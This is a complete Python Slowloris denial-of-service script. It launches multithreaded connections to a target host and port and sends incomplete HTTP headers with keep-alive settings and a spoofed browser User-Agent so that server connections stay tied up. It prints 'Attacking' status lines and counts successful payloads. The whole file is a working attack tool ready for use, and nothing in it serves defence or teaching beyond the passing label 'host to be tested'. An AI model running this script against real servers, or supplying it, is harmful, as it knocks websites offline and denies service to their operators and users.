import sys
import socket
import time
import signal
import threading
import argparse

# Define command-line arguments
args = None
# Initialize counters for successful and failed payloads as global variables
amount_success = 0
amount_failed = 0

# Define the main function for the Slowloris attack
def slowloris():
    # Parse the target URL into host and port
    url = args.host
    host, port = parse_target_url(url)
    # Print target information
    print_target(host, port)
    # Print initial status
    print_status()
    # Start multiple attack threads
    start_attack_threads(host, port)
    try:
        # Wait for an interrupt (e.g., Ctrl+C)
        interruptable_event().wait()
    except KeyboardInterrupt:
        sys.exit(0)

# Function to parse the target URL into host and port
def parse_target_url(url):
    parts = url.split(':')
    host = parts[0]
    port = int(parts[1]) if len(parts) == 2 else 80
    return host, port

# Function to start multiple attack threads
def start_attack_threads(host, port):
    for _ in range(args.threads):
        try:
            # Create a new thread for the attack
            thread = threading.Thread(target=setup_attack, args=(host, port))
            thread.daemon = True
            thread.start()
        except:
            pass

# Function to set up the attack within each thread
def setup_attack(host, port):
    while True:
        sockets = []
        tries_failed = 0
        while True:
            sock = create_socket()
            if sock:
                sock.settimeout(5)
                sockets.append(sock)
                if not send_payload(sock, host, port):
                    tries_failed += 1
                if tries_failed > 5:
                    break
        # Sleep for a specified interval
        time.sleep(args.keepalive)
        disconnect_sockets(sockets)

# Function to create a socket with appropriate options
def create_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if sys.platform == 'linux' or sys.platform == 'linux2':
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, args.interval)
        elif sys.platform == 'darwin':
            sock.setsockopt(socket.IPPROTO_TCP, 0x10, args.interval)
        elif sys.platform == 'win32':
            sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, args.keepalive * 1000, args.interval * 1000))
        return sock
    except:
        return None

# Function to send a payload in the Slowloris attack
def send_payload(sock, host, port):
    global amount_success, amount_failed  # Declare as global to modify the global variables
    random = int(time.time() * 1000) % 10000
    method = 'POST' if random % 2 == 0 else 'GET'
    payload = ('%s /?%i HTTP/1.1\r\n'
               'Host: %s\r\n'
               'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1234.5678 Safari/537.36\r\n'
               'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n'
               'Connection: Keep-Alive\r\n'
               'Keep-Alive: timeout=%i\r\n'
               'Content-Length: 42\r\n') % (method, random, host, args.keepalive)
    try:
        # Connect to the target and send the payload
        sock.connect((host, port))
        sock.sendall(payload.encode('utf-8'))
    except Exception as e:
        # Increment the count of failed payloads and print status
        amount_failed += 1
        print_status()
        return False
    # Increment the count of successful payloads and print status
    amount_success += 1
    print_status()
    return True

# Function to print the target information
def print_target(host, port):
    str_target = f'Attacking \033[1m{host}:{port}\033[0m'
    print(str_target)

# Function to print the attack status
def print_status(str_extra=None):
    global amount_success, amount_failed  # Declare as global to access the global variables
    str_success = f'\033[92mPayloads successful: {amount_success}'  # Access global variable
    str_and = '\033[90m, '
    str_failed = f'\033[91mPayloads failed: {amount_failed}'  # Access global variable
    str_extra = ('\033[0m, ' + str_extra) if str_extra else ''

    # Print status on the same line and clear the line
    print(f'{str_success}{str_and}{str_failed}{str_extra}\033[0m', end='\r')
    sys.stdout.write("\033[K")


# Function to disconnect and close sockets
def disconnect_sockets(sockets):
    for sock in sockets:
        try:
            sock.shutdown(socket.SHUT_RDWR)
        except:
            pass
        finally:
            sock.close()

# Function to create an interruptable event
def interruptable_event():
    e = threading.Event()

    def patched_wait():
        while not e.is_set():
            e._wait(3)

    e._wait = e.wait
    e.wait = patched_wait
    return e

# Signal handler for interrupt signals (e.g., Ctrl+C)
def signal_handler(signal, frame):
    print_status(':)\n')
    sys.exit(0)

if __name__ == '__main__':
    # Define command-line arguments and parse them
    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='Host', nargs=None, help='host to be tested')
    parser.add_argument('-n', dest='threads', type=int, default=8, nargs='?', help='number of threads (default 8)', action="store")
    parser.add_argument('-k', dest='keepalive', type=int, default=90, nargs='?', help='seconds to keep connection alive (default 90)', action="store")
    parser.add_argument('-i', dest='interval', type=int, default=5, nargs='?', help='seconds between keep alive check intervals (default 5)', action="store")
    args = parser.parse_args()

    # Set up signal handlers for non-Windows platforms
    if sys.platform != 'win32':
        signal.signal(signal.SIGHUP, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)

    # Start the Slowloris attack
    slowloris()

